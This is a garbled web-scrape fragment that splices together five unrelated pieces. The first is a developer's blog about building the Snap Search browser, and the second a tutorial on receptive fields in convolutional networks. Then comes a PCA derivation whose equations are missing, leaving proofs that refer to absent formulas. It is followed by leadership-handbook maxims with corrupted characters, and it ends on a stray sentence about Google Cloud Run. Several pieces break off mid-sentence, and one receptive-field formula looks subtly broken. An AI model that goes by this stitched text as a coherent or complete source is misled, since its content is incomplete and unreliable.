https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1536x1336.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/07/before-after-2048x1781.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1160x1009.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_58/https://snapsearch.online/wp-content/uploads/2020/07/before-after-58x50.png 58w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/07/before-after-650x565.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1000x870.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/07/before-after-50x43.png 50w"><figcaption>Before (left) v/s Now (right)</figcaption></figure><p>There were a couple of things I knew from the start about what I wanted this app to be and how I wanted it to be.</p><ol><li>I knew I wanted a Proxy Mode/VPN ability for those users who really wanted to be safe on the web. Doing so wasn’t going to be easy or cheap – and so I had to introduce a ‘Premium Mode’. Now, <a aria-label="undefined (opens in a new tab)" href="https://snapsearch.online/app-change-log/" target="_blank" rel="noreferrer noopener">27 releases later</a> there are multiple <a aria-label="undefined (opens in a new tab)" href="https://snapsearch.online/general/why-should-i-pay-for-premium-mode-of-snap-search/" target="_blank" rel="noreferrer noopener">reasons to buy a premium plan</a> for Snap Search.</li><li>The app should NEVER ask for permissions. No storage, no location, no gallery, no contacts – nothing. If any feature required it, I would have to find a way around it or Snap Search would just have to be a browser without it.</li><li>No ads on Snap Search. Personally, I hate ads.</li></ol><p>And so, I just kept building.</p><p>Most app updates involved introducing New Features and UI Improvements. I made myself understand a few things beforehand:</p><ul><li>It needs to look good or people won’t use it.</li><li>It needs to be unique or people won’t use it.</li><li>It needs to work as promised or people will hate it.</li></ul><p>I guess these are standard points for any application/platform/service. However, that doesn’t make it any less important. In fact, I made sure to remember the same every time I sat down to write code or work on the app.</p><h4>Deciding What To Do Next</h4><p>Have you heard of a concept called the “Writer’s Block”? I was scared I’d face something similar – like a “Developer’s Block” or “Maker’s Block”. After every update I’d sit down and think – Do I have anything to do for the next update?</p><p>I always had the option of just improving what is already there – which is a good thing to do obviously, but I wanted something new to add, whether it was a new feature or an update to the UI. The current browser is a result of just that. I didn’t think of the current design at the start, it came to look like this after changes again and again.

<p>In this article, we will discuss multiple perspectives that involve the receptive field of a deep convolutional architecture. We will address the influence of the receptive field starting for the human visual system. As you will see, a lot of terminology of deep learning comes from neuroscience. As a short motivation, convolutions are awesome but it is not enough just to understand how it works. <strong>The idea of the receptive field will help you dive into the architecture that you are using or developing</strong>. If you are looking for an in-depth analysis to understand how you can calculate the receptive field of your model as well as the most effective ways to increase it, this article was made for you. In the end, fundamentals are to be mastered! Let’s begin.</p>

<p>According to Wikipedia [1], the receptive field (of a biological neuron) is “<strong>the portion of the sensory space that can elicit neuronal responses, when stimulated”</strong>. The sensory space can be defined in any dimension (e.g. a 2D perceived image for an eye). Simply, the neuronal response can be defined as the firing rate (i.e. number of action potentials generated by a neuron). It is related to the time dimension based on the stimuli. What is important is that it affects the received frames per second (FPS) of our visual system. It is not clear what is the exact FPS of our visual system, and it is definitely changing in different situations (i.e. when we are in danger). Wikipedia [2] says:</p>

<blockquote>
  <p>Insight: The human visual system can process 10 to 12 images per second and perceive them individually, while higher rates are perceived as motion.</p>
</blockquote>

<p>Let’s observe this image to further clarify these concepts:</p>

<em>The visual human system. Source: <a href="https://brainconnection.brainhq.com/2004/03/06/overview-of-receptive-fields/" rel="noopener" target="_blank">brainconnection</a></em></p>

<p>Based on the image, the entire area (the grid in the figure) an eye can see is called the field of view. The human visual system consists of millions of neurons, where each one captures different information. We define the <strong>neuron’s receptive field</strong> as <strong>the patch</strong> of the total field of view. In other words, <strong>what information a single neuron has access to</strong>. This is in simple terms the biological cell’s receptive field.</p>

<p>Let’s see how we can extend this idea in convolutional networks.</p>

<h2 id="what-is-the-receptive-field-in-deep-learning">What is the receptive field in deep learning?</h2>

<p>Similarly, in a deep learning context, the Receptive Field (<strong>RF</strong>) is defined as <strong>the size of the region in the input that produces the feature</strong>[3]. Basically, it is a measure of association of an output feature (of any layer) to the input <strong>region</strong> (patch). Before we move on, let’s clarify one important thing:</p>

<blockquote>
  <p>Insight: The idea of receptive fields applies to local operations (i.e. convolution, pooling).</p>
</blockquote>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/receptive-field-in-convolutional-networks.png" alt="receptive-field-in-convolutional-networks">
<em>Source: <a href="https://www.researchgate.net/figure/The-receptive-field-of-each-convolution-layer-with-a-3-3-kernel-The-green-area-marks_fig4_316950618" rel="noopener" target="_blank">Research Gate</a></em></p>

<p>A convolutional unit only depends on a local region (patch) of the input. That’s why we never refer to the RF on fully connected layers since each unit has access to all the input region. To this end, our aim is to provide you an insight into this concept, in order to understand and analyze how deep convolutional networks work with local operations work.</p>

<p>Ok, but why should anyone care about the RF?</p>

<h2 id="why-do-we-care-about-the-receptive-field-of-a-convolutional-network">Why do we care about the receptive field of a convolutional network?</h2>

<p>There is no better way to clarify this than a couple of computer vision examples. In particular, let’s revisit a couple of dense prediction computer vision tasks. Specifically, in <a href="https://theaisummer.com/Semantic_Segmentation/" target="_blank">image segmentation</a> and optical flow estimation, we produce a prediction for each pixel in the input image, which corresponds to a new image, the semantic label map. Ideally, we would like each output pixel of the label map to have a big receptive field, so as to ensure that no crucial information was <strong>not</strong> taken into account. For instance, if we want to predict the boundaries of an object (i.e. a car, an organ like the heart, a tumor) it is important that we provide the model access to all the relevant parts of the input object that we want to segment. In the image below, you can see two receptive fields: the green and the orange one. Which one would you like to have in your architecture?</p>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/receptive-fields-semantic-segmentation.png" alt="receptive-fields-semantic-segmentation">
<em>The green and orange rectangles are two different receptive fields. Which one would you prefer? The green and orange rectangles are two different receptive fields. Which one would you prefer? ￼￼Source: <a href="https://developer.nvidia.com/blog/image-segmentation-using-digits-5/" rel="noopener" target="_blank">Nvidia’s blog</a></em></p>

<p>Similarly, in <a href="https://theaisummer.com/Localization_and_Object_Detection/" target="_blank">object detection</a>, a small receptive field may not be able to recognize large objects. That’s why you usually see multi-scale approaches in object detection. Furthermore, in motion-based tasks, like video prediction and optical flow estimation, we want to <strong>capture large motions</strong> (<strong>displacements</strong> of pixels in a 2D grid), so we want to have an adequate receptive field. Specifically, <strong>the receptive field should be sufficient if it is larger than the largest flow magnitude of the dataset</strong>.</p>

<p>Therefore, our goal is to design a convolutional model so that we ensure that <strong>its RF covers the entire relevant input image region</strong>.</p>

<p>To convince you even more, in the diagram below you can see the relation of the RF to the classification accuracy in ImageNet. The radius refers to the amount of floating-point operations (FLOPs) of each model. The purple corresponds to the ResNet [4] family (50-layer, 101, and 152 layers), while the yellow is the inception [5] family (v2, v3, v4). Light-blue is the MobileNet architecture.</p>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/imagenet-classification-and-receptive-field.png" alt="imagenet-classification-and-receptive-field">
<em>Image is borrowed from Araujo et al. [3]</em></p>

<p>As perfectly described by Araujo et al. [3]:</p>

<blockquote>
  <p>“We observe a <strong>logarithmic relationship between classification accuracy and receptive field size</strong>, which suggests that large receptive fields are necessary for high-level recognition tasks, but with diminishing rewards.”</p>
</blockquote>

<p>Nevertheless, the receptive field size <strong>alone is not the only factor</strong> contributing to improved recognition performance. However, the point is that you should definitely be aware of your model’s receptive field.</p>

<p>Ok,  so how can we measure it?</p>

<h2 id="closed-form-calculations-of-the-receptive-field-for-single-path-networks">Closed-form calculations of the receptive field for single-path networks</h2>

<p>In the amazing work by Araujo et al. [3], they provide an intuitive way to calculate in an analytical form the RF of your model. A single path literally means no <a href="https://theaisummer.com/skip-connections/" target="_blank">skip connections</a> in the architecture, like the famous AlexNet. Let’s see some math! For two sequential convolutional layers \(f2 , f1\) with kernel size \(k\), stride \(s\), receptive field \(r\):</p><p>

\[r_1 = s_2 \times r_2 + (k_2-s_2)\]

</p><p>Or in a more general form:</p><p>

\[r_(i-1) = s_{i} \times r_{i} + (k_{i}-s_{i})\]

</p><p>The image below may help you clarify this equation. Note that <strong>we are interested to see the influence of the receptive field starting from the last layer towards the input</strong>. So, in that sense, we go backwards.</p>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/receptive-field-1d-conv-visualization.png" alt="receptive-field-1d-conv-visualization">
<em>1D sequential conv. Layers visualization taken from Araujo et al. [3]</em></p>

<p>It seems like this equation can be generalized in a beautiful compact equation that simply applies this operation recursively for L layers. By further analyzing the recursive equation, we can derive a closed form solution that depends only on the convolutional parameters of kernels and strides [3]:</p><p>

\[r_0 = \sum_{i=1}^{L} ( (k_{i} -1) \prod_{j=1}^{l-1} s_{j}  ) + 1 \quad \quad (eq.1)\]

</p><p>Where \(r_0\) denoted the desired RF of the architecture.</p>

<p>Ok, I measured the <strong>theoretical RF</strong> of my model. Now, how can I increase it?</p>

<h2 id="how-can-we-increase-the-receptive-field-in-a-convolutional-network">How can we increase the receptive field in a convolutional network?</h2>

<p>In essence, there are a plethora of ways and tricks to increase the RF, that can be summarized as follows:</p>

<ol>
  <li>
    <p>Add more convolutional layers (make the network deeper)</p>
  </li>
  <li>
    <p>Add pooling layers or higher stride convolutions (sub-sampling)</p>
  </li>
  <li>
    <p>Use <a href="https://www.reddit.com/r/MachineLearning/comments/52drsq/what_is_dilated_convolution/" rel="noopener" target="_blank">dilated convolutions</a></p>
  </li>
  <li>
    <p>Depth-wise convolutions</p>
  </li>
</ol>

<p>Let’s look at the <strong>distinct characteristics</strong> of these approaches.</p>

<h4 id="add-more-convolutional-layers">Add more convolutional layers</h4>

<p>Option 1 increases the receptive field size <strong>linearly</strong>, as each extra layer increases the receptive field size by the kernel size [7]. Moreover, it is experimentally validated that as the theoretical receptive field is increasing but the effective (experimental) receptive field is reducing. RF refers to the RF, while ERF corresponds to the effective RF.</p>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/Effective-receptive-field-ratio-with-more-layers.png" alt="Effective-receptive-field-ratio-with-more-layers">
<em>Increasing the number of layers decreases the ERF ration, taken from Luo et al. [7]</em></p>

<h4 id="sub-sampling-and-dilated-convolutions">Sub-sampling and dilated convolutions</h4>

<p><strong>Sub-sampling</strong> techniques like pooling (option 2) on the other hand, <strong>increases</strong> the receptive field size <strong>multiplicatively</strong>. Modern architectures like ResNet combine these techniques(option 1 and 2). On the other hand, sequentially placed dilated convolutions, <strong>increase the RF exponentially</strong>.</p>

<p>But first, let’s revisit the idea of dilated convolutions.</p>

<p>In essence, dilated convolutions introduce another parameter, denoted as r, called the dilation rate. <strong>Dilations introduce “holes” in a convolutional kernel</strong> [3]. The “holes” basically define a spacing between the values of the kernel. So, while the number of weights in the kernel is unchanged, the weights are no longer applied to spatially adjacent samples. Dilating a kernel by a factor of \(r\) introduces a kind of striding of \(r\).</p>

<p>The pre-described equations can be reused by simply replacing the kernel size \(k\) for all layers using dilations:</p><p>

\[k’= r (k−1)+1\]

</p><p>Keep this equation in the back of your mind.</p>

<p>All the above can be illustrated in the following gif, produced by Dumoulin et al. 2016 [11]. I think the image speaks for itself:</p>

      <h3 id="introduction">Introduction</h3>

<p>Principal components analysis (PCA) is one of a family of techniques for taking high-dimensional data, and using the dependencies between the variables to represent it in a more tractable, lower-dimensional form, without losing too much information. It has been widely used for data compression and de-noising. However, its entire mathematical process is sometimes ambiguous to the user.</p>



<p>In this article, I would like to discuss the entire process of PCA mathematically, including PCA projection and reconstruction, with most of the derivations and proofs provided. At the end of the article, I implemented PCA projection and reconstruction from scratch. After reading this article, there should be no more black box in PCA anymore.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="orthogonal-matrix">Orthogonal Matrix</h4>

<p>In linear algebra, an orthogonal matrix is a real square matrix whose columns and rows are orthogonal unit vectors (orthonormal vectors).</p>



<p>Equivalently, the mathematical expression is</p>



<p>By <a href="https://en.wikipedia.org/wiki/Invertible_matrix">the definition of invertible matrix</a>, this means matrix $A$ is invertible and $A^{-1} = A^{\top}$.</p>



<p>We could also view this from the perspective of determinant.</p>



<p>Because $A$ and $A^{\top}$ are square matrices and using <a href="https://en.wikipedia.org/wiki/Determinant#Properties_of_the_determinant">the properties of determinant</a></p>



<p>Since $\det(A) \neq 0$, matrix $A$ is invertible. We multiply $A^{-1}$ on both side of the orthogonal matrix definition.</p>



<p>We have also derived the conclusion that $A^{-1} = A^{\top}$.</p>



<p>Similarly, a complex square matrix $A$ is unitary if its transpose conjugate $A^{\dagger}$ is also its inverse.</p>



<p>Equivalently, the mathematical expression is</p>



<h4 id="symmetric-matrix">Symmetric Matrix</h4>

<p>Real symmetric matrix has the following useful properties:</p>



<p>If $A$ is a real symmetric matrix, all of its eigenvalues are real numbers.</p>



<p>Because of <a href="https://en.wikipedia.org/wiki/Complex_conjugate#Generalizations">the conjugate properties</a> and $\overline{A} = A$ since $A$ is a real value matrix,</p>



<p>We got $A \overline{v} = \overline{\lambda} \overline{v}$.</p>



<p>Let $\lambda \in \mathbb{C}$ be an eigenvalue of the symmetric matrix $A$. $Av = \lambda v$ and $v \neq 0$. We multiply $v^{\dagger}$ ($v^{\dagger} = \overline{v}^{\top}$) to the both sides, and because of $A^{\top} = A$ and the property we have just derived $A \overline{v} = \overline{\lambda} \overline{v}$,</p>



<p>We have $\lambda v^{\dagger} v = \overline{\lambda} v^{\dagger} v$, thus $\lambda$ is real.</p>



<p>This concludes the proof.</p>

<h4 id="positive-semi-definite-matrix">Positive Semi-Definite Matrix</h4>

<p>The $n \times n$ symmetric matrix $A$ is defined to be positive semi-definite, if $x^{\dagger} A x \geq 0$ for $x \in \mathbb{C}^n$.</p>



<p>The positive semi-definite matrix has the following important property:</p>



<p>The eigenvalues of positive semi-definite matrix are non-negative.</p>



<p>Because $x^{\dagger} A x \geq$ for $x \in \mathbb{C}^n$, suppose $x$ is an eigenvector of $A$ and $Ax = \lambda x$ where $x \neq 0$,</p>



<p>Because $x^{\dagger} x$ must be real number and $x^{\dagger} x &gt; 0$, we have $\lambda \geq 0$.</p>



<p>This concludes the proof.</p>

<h4 id="covariance-matrix">Covariance Matrix</h4>

<p>The covariance matrix has the following important property:</p>



<p>Covariance matrix is positive semi-definite. This means that the eigenvalues of covariance matrix is non-negative.</p>



<p>The proof of that covariance must be positive semi-definite could be found in my previous post on <a href="https://leimao.github.io/blog/Multivariate-Gaussian-Covariance-Matrix/">Multivariate Gaussian and Covariance Matrix</a>.</p>

<h4 id="singular-values">Singular Values</h4>

<p>The singular values, $\sigma_1$, $\sigma_2$, $\cdots$, $\sigma_r$, of an $m \times n$ matrix $A$ are the square roots, $\sigma_i = \sqrt{\lambda_i}$, of non-negative eigenvalues of the associated Gram matrix $K = A^{\dagger}A$. The corresponding eigenvectors of $K$ are known as singular vectors of $A$.</p>



<p>Note that the associated Gram matrix $K = A^{\dagger}A$ is real and symmetric, so the eigenvalues of $K$ are all real.</p>



<p>$K = A^{\dagger}A$ is also positive semi-definite.</p>



<p>For any vector $x$</p>



<p>Because $Ax$ is also a vector,</p>



<p>Therefore, all the eigenvalues of $K = A^{\dagger}A$ are non-negative and they all have a corresponded singular value of $A$.</p>

<h4 id="singular-value-decomposition">Singular Value Decomposition</h4>

<p>In linear algebra, the singular value decomposition (SVD) is a factorization of a real or complex matrix that generalizes the eigendecomposition of a square normal matrix to any $ m\times n$ matrix via an extension of the polar decomposition.</p>



<p>Specifically, the singular value decomposition of an $m \times n$ real or complex matrix $M$ is a factorization of the form $U \Sigma V^{\dagger}$, where $U$ is an $m \times m$ real or complex unitary matrix, $\Sigma$ is a $m \times n$ rectangular diagonal matrix with non-negative real numbers on the diagonal, and $V$ is an $n \times n$ real or complex unitary matrix.</p>



<p>The diagonal entries $\sigma_{i}=\Sigma_{ii}$ of $\Sigma$ are known as the singular values of $M$. The number of non-zero singular values is equal to the rank of $M$.</p>



<p>In particular, for any matrix $A \in \mathbb{C}$,</p>



<p>We will skip the proof for why every matrix has SVD and the algorithm for SVD.</p>

<h4 id="singular-value-decomposition-for-norm-matrix">Singular Value Decomposition for Norm Matrix</h4>

<p>For any matrix $A \in \mathbb{C}$, $A^{\dagger} A$ could be expressed as</p>



<p>We multiply $V$ at both side of the equation.</p>



<p>Note that $\Sigma^{\dagger} \Sigma$ is a square diagonal matrix. Based on the definition of eigenvalue and eigenvectors, the diagonal values of $\Sigma^{\dagger} \Sigma$, including the zeros, are the eigenvalues of $A^{\dagger} A$. All the columns of $V$ are the corresponding eigenvectors of $A^{\dagger} A$.</p>



<p>Similarly, $A A^{\dagger}$ could be expressed as</p>



<p>Note that $\Sigma \Sigma^{\dagger}$ is a square diagonal matrix. Based on the definition of eigenvalue and eigenvectors, the diagonal values of $\Sigma \Sigma^{\dagger}$, including the zeros, are the eigenvalues of $A A^{\dagger}$. All the columns of $U$ are the corresponding eigenvectors of $A A^{\dagger}$.</p>

<h3 id="mathematics-of-principal-components-analysis">Mathematics of Principal Components Analysis</h3>

<p>We start with $p$-dimensional vectors, and want to summarize them by projecting down into a $q$-dimensional subspace, where $q \leq p$. Our summary will be the projection of the original vectors on to $q$ directions, the principal axes, which span the subspace.</p>

<h4 id="minimizing-projection-residuals">Minimizing Projection Residuals</h4>

<p>Given a dataset $X \in \mathbb{R}^{n \times p}$ whose row is the centered data vectors $x_i \in \mathbb{R}^p$ for $0 \leq i \leq n-1$ ($\sum_{i=0}^{n-1} x_{i} = 0$), if we have a unit vector $w \in \mathbb{R}^p$ ($|w| = 1$) and we project the all the data vectors to this unit vector $w$.</p>



<p>The length of projection for data vector $x_i$ on $w$, by definition, is</p>



<p>where $\langle x_i, w \rangle$ is the inner product of $x_i$ and $w$.</p>



<p>The projection vector for data vector $x_i$ on $w$ is $\langle x_i, w \rangle w$.</p>



<p>The residual, which is the distance from data vector $x_i$ to $w$, is the length of vector $x_i - \langle x_i, w \rangle w$.</p>



<p>Let’s check what the residual square $| x_i - \langle x_i, w \rangle w | ^2$ is.</p>



<p>The optimization goal of projection is to minimize mean squared error $\text{MSE}(w)$, which is the mean of the residual sum of squares.</p>



<p>Remember the relationship between variance and expected value, $\mathbb{V}(X) = \mathbb{E}(X^2) - \mathbb{E}(X)^2$, we have</p>



<p>So $\frac{1}{n} \sum_{i=0}^{n-1}  \langle x_i, w \rangle ^2$ is actually the variance of the inner product between data vector and the projection unit vector $\mathbb{V}\big(\langle x, w \rangle\big)$.</p>



<p>We further have another expression of $\text{MSE}(w)$.</p>



<p>Because $\mathbb{E}\big(\langle x, x \rangle\big)$ is not dependent on $w$, minimizing the mean of the residual sum of squares $\text{MSE}(w)$ turns out to be equivalent to maximizing the variance of the inner product between data vector and the projection unit vector.</p>



<p>The variance of the inner product between data vector and the projection unit vector could also be expressed using the dataset matrix $X$.</p>



<p>where $\frac{X^{\top} X}{n}$ is the covariance matrix of $X$.</p>



<p>If we project the data vectors to $q$ orthogonal unit vectors $w_0$, $w_1$, $\cdots$, $w_{q-1}$. These unit vectors assembled as columns to a matrix $W \in \mathbb{R}^{p \times q}$. Then our optimization goal becomes maximizing the residual sum of squares on all these projection vectors.</p>



<p>subject to</p>



<h4 id="maximizing-variance">Maximizing Variance</h4>

<p>Suppose we are projecting the data to $p$ orthonormal unit vectors $w \in \mathbb{R}^{p}$. These unit vectors assembled as columns to a matrix $W \in \mathbb{R}^{p \times p}$, and $W$ is a orthonormal matrix.</p>



<p>subject to</p>



<p>Let’s try to maximize one $\mathscr{L}(w) = w^{\top} X^{\top} X w$ first, and the constrain is $w^{\top} w = 1$. We would use Lagrange multiplier $\lambda$ to help us solve the optimization problem.</p>





<p>We set $\frac{\partial \mathscr{L}}{\lambda} = 0$ and $\frac{\partial \mathscr{L}}{w} = 0$, we get</p>



<p>So by definition, $\lambda$ and $w$ are the eigenvalue and eigenvector of matrix $X^{\top} X$.</p>



<p>Because $X^{\top} X$ is real symmetric matrix and positive semi-definite, all the eigenvalues of $X^{\top} X$ are non-negative.</p>



<p>$X^{\top} X$ has exact $p$ eigenvalues $\lambda_0, \lambda_1, \cdots, \lambda_{p-1}$ and their corresponding eigenvectors $w_0, w_1, \cdots, w_{p-1}$. The matrix $W$, which consists of the eigenvectors $w_0, w_1, \cdots, w_{p-1}$, happens to be the global maximum solution for $\mathscr{L}(W)$. The global maximum value for $\mathscr{L}(W)$ is the sum of non-negative eigenvalues.</p>



<p>Because these eigenvalues are non-negative, and their contribution to the global maximum could be sorted by their values.</p>



<p>We call the eigenvector corresponding to the largest eigenvalue the first principal axis, the eigenvector corresponding to the second largest eigenvalue the second principal axis, and so on.</p>



<p>Suppose we are projecting the data to $q$ orthonormal unit vectors $w \in \mathbb{R}^{p}$, and $q \leq p$. These unit vectors assembled as columns to a matrix $W \in \mathbb{R}^{p \times q}$. The optimization problem becomes maximizing the following equation.</p>



<p>subject to</p>



<p>However, the solution is obvious. We just have to pick the $q$ largest eigenvalues and their …</p></div></div>

</center><p>1. This handbook is different. It starts with the question, â€˜How can you learn to lead?â€™ In our research with over 1,000 leaders at all levels in public, private and voluntary sectors the answer was clear: leaders learn not from courses but from experience, bosses, peers and role models.</p><p>2. Finally, it is worth learning one lesson from the worldâ€™s top athletes. Each gold medallist is supreme in one discipline: they focus relentlessly on becoming the best at one thing. They do not focus on their weaknesses. No one asks weightlifters to improve their synchronized swimming skills. Leaders, like athletes, cannot succeed at everything. They have to focus on their strengths, practise relentlessly and find the context or discipline in which they can flourish.</p><p>3. <b>Our research found no effective leaders who were cynical about their work, their organization, themselves or their lives. They were relentlessly positive about everything.</b></p><p>4. <b>If you want a high-performing team, do not be afraid to set high expectations.</b></p><p>5. To build trust with your followers, you have to be honest with them. This is hard-form honesty: telling the whole truth promptly, even when it is painful.</p><p>6. <b>Authority and popularity are weak currencies for leadership. Authority can be removed in a reorganization. Popularity leads to weakness: you avoid the difficult conversations; you avoid stretching the team too far; you accept excuses. Honesty and trust are the true currencies for leadership. No one can take them away from you. Honesty and trust build respect, which lasts longer than popularity.</b></p><p>7. An ineffective team will all be clones of the leader. An effective team will complement the leaderâ€™s technical strengths and personal style. Your job is not to be the best person on the team. As a leader, your job is to get all the best people onto the team.</p><p>8. Athletes, like leaders, do not win by playing to their weaknesses and imagining failure. They win by building on their strengths and rehearsing, visualizing success in their minds. From this comes four principles :</p><blockquote>
<p>i. Play to your strengths</p>
<p>ii. Visualise Success</p>
<p>iii. Think like a winner</p>
<p>iv. Create a team that compensates for your weaknesses</p>
</blockquote><p>9. Coach yourself by following the plan-do-review cycle on all your activities:<br></p><blockquote>
<p>i. Plan - what you want to achieve and how.Â&nbsp;</p>
<p>ii. Do it.</p>
<p>iii. Review it - Review stage is where you learn most and it is your chance to accelerate your career. It is your secret weapon.</p>
</blockquote><p>10. After any key event, ask yourself two questions:<br></p><blockquote>
<p>Â&nbsp;i. WWW. What went well? Success is not the natural state of things. When things work well, step back and ask why? This is how you will build your personal success formula.</p>
<p>Â&nbsp;ii. EBI: Even better if. Ask what you could have done differently, or tried to make things work better.</p>
</blockquote><p>11. Warren Buffet remarked that â€˜when a great manager joins a lousy company, it is normally the reputation of the company that remains intactâ€™.</p><p>12. Strong teams are diverse. Diversity means more than diversity of race, gender, age and faith.Â&nbsp; It means the subtler diversity of building a team with complementary styles, skills and perspectives. A football team of 11 great goalkeepers is unlikely to do well.</p><p>13. <b>Failure to delegate traps you into doing low-level jobs. You cannot lead if you cannot delegate. </b>Here is why you must delegate :<br></p><blockquote>
<p>i. Delegation is the only way to create more than 24 hours in a day. If you don't delegate, you work yourself into an early grave.</p>
<p>ii.Delegation allows you to focus on the areas where you make the most difference.</p>
<p>iii. It shows you have trust in the team, and most teams will respond to your vote of confidence in them by working hard to show they are worthy of your trust.</p>
<p>iv. It builds and stretches your team: they have to learn new skills.</p>
</blockquote><p>14. Principles of delegation :Â&nbsp;<br></p><blockquote>
<p>-Ensure clarity of the task and the eventual success criteria.</p>
<p>-Make the team summarise back to you what they think the task and outcomes are meant to be. Do not assume they have understood anything until they say it back to you.</p>
<p>-Ensure people have enough skills and resources to complete the job : do not delegate too much too soon.</p>
<p>-Be clear about how you want to work together (progress reports). Discuss concerns before you start.</p>
<p>-Be available to help, but do not interfere all the time. When they ask for help, require them to suggest solutions so that they always learn.</p>
<p>-Delegate meaningful projects, not just adminstriva. Stretch people and they will rise to the challenge. Giving away mundane jobs only demotivates people.</p>
<p>-Show faith and trust in the team : praise successes and do not undermine them</p>
<p>-Remember, you may have delegated authority, but you cannot delegate away responsibility. You are still accountable for the outcomes.</p>
</blockquote><p>15. Always try to figure out how to appeal to fear, greed and idleness.</p><p>16. Five drivers of motivation in the workplace:<br></p><blockquote>
<p>i. My boss shows an interest in my career.</p>
<p>ii. I trust my boss; he/she is honest with me.</p>
<p>iii. I know where we are going and how to get there.</p>
<p>iv. I am doing a worthwhile job.</p>
<p>v. I am recognized for my contribution</p>
</blockquote><p>17. The best way to communicate is to shut up. If necessary, put duct tape over your mouth and force yourself to listen. The more you listen, the more you understand. When you really understand what the other person is thinking, then you can influence them positively.</p><p>18. Good leaders normally have a simple agenda, which boils down to three things: idea, people, money, or the IPM agenda:</p><blockquote>
<p>i. Idea. You need to have a simple idea about what you will do that will be different from and better than the past. The best ideas are simplest: â€˜We will increase customer satisfactionâ€™, â€˜We will increase reliabilityâ€™, â€˜We will reduce costsâ€™.</p>
<p>ii. People. If you have the B team, you have a recipe for sleepless nights and stress. Do not assume that the team you inherited is the team you must live with.</p>
<p>iii. Money. Make sure you have the right budget to fulfil your goals.</p>
</blockquote><p>19. SPIN â€“ situation and specifics, personal impact, insight and inquiry, and next steps â€“ is a classic and simple framework for giving negative feedback:<br></p><blockquote>
<p>i. Situation and specifics. Give feedback in the right situation: when the person is calm and the event is still fresh in the mind.</p>
<p>ii. Personal impact. Do not judge the other person: that invites conflict. Say how his or her actions made you feel: feelings are irrefutable. For example, say: â€˜You have turned up late to three client meetings; it makes me feel you think they are unimportantâ€™, not: â€˜You are a lazy idlerâ€™, â€˜I was very embarrassed when the CFO saw the errors in the budget you preparedâ€™, or â€˜You are an innumerate scumbag.â€™</p>
<p>iii. Insight and inquiry. Ask questions to see if the person understands the problem, to help him or her explore and evaluate options and discover the way forward.</p>
<p>iv. Next steps. Mutually agree what happens next. There needs to be a positive way forward. You need to have thought through possible options and actions.</p>
</blockquote><p>20. The Art of War advocated fighting under only three conditions, all of which must be present: 1) only fight when there is a prize worth fighting for; 2) only fight when you know you will win; and 3) only fight when there is no alternative.</p><p>21. The trust equation shows that trust (T) is a function of values alignment (V) and credibility (C) offset by risk (R): high risk means you need higher levels of trust to work together.<br></p><p>22. You have no permanent friends or allies; there are only permanent interests. At some point, your interests and their interests will go different ways simply because you are in different roles and have different priorities.</p><div><p>23. The more senior you become, the harder you have to push for the next step. Early in your career, if you work hard and do well you will be promoted because every firm wants to encourage the next generation of leadership talent. But as your career progresses, there are fewer opportunities and there is more competition. Leadership is not given to you; you have to take it.</p><p>24. Everyone is selling: ideas, proposals and social events. We normally sell at three levels: features (â€˜ My computer has 8GB RAM memoryâ€™); benefits (â€˜ It can handle video editingâ€™); dreams (â€˜ It could turn me into a Hollywood mogulâ€™).</p></div><p>25. Avoid selling features. At least work out the benefits, or ideally the dreams, that will appeal to the person you are selling to. Start with what the person wants, not with what you have.</p><p>26. We have already met fear, greed, idleness and risk in motivation skills. We meet them again in selling skills. They work together:Â&nbsp;</p><blockquote>
<p>-Fear: What problem am I solving for the other person? </p>
<p>-Greed: What hope or dream am I helping the other person achieve? </p>
<p>-Idleness and risk: Am I making it easy for the other person to agree? Have I removed the risks he or she perceives?</p>
</blockquote><div><p>27. The selling proposition varies dramatically depending on who you are selling to. You succeed when you focus less on the product and more on the buyerâ€™s needs.</p><p>28. It is not enough to know what to sell. You also need to know how to sell. Here is a classic seven-step sales cycle:Â&nbsp;</p></div><blockquote>
<p>-Agree the problem/ opportunity. </p>
<p>-Preview the benefits of addressing the problem/ opportunity. </p>
<p>-Suggest the idea. </p>
<p>-Explain how it works. </p>
<p>-Pre-empt objections. </p>
<p>-Reinforce the benefits. </p>
<p>-Close.</p>
</blockquote><p>29. <b>Many leaders come to the realization that they hire for skills and fire for (the wrong) values. Do not make that mistake. Hire to values, not just to skills.</b></p><p>30. The new currency of leadership is respect. Respect is based on two vital ingredients: trust and positive challenge. Trust is dealt with extensively elsewhere in the book. As a reminder, you build trust through values alignment (you â€˜talk the talkâ€™ of the other person) and credibility (you always deliver on commitments, or you â€˜walk the talkâ€™). Trust is good, but not enough for respect. As a leader you will gain …</p></div></div></div>

That is until a few months ago.</p><p>Google recently announced <a href="https://cloud.google.com/run">Cloud Run</a>. It allows anyone to deploy containers in production really fast. The best part is the pricing: one only pays for the milliseconds that they use. The container becomes "alive" when a request comes in and "pauses" right after.

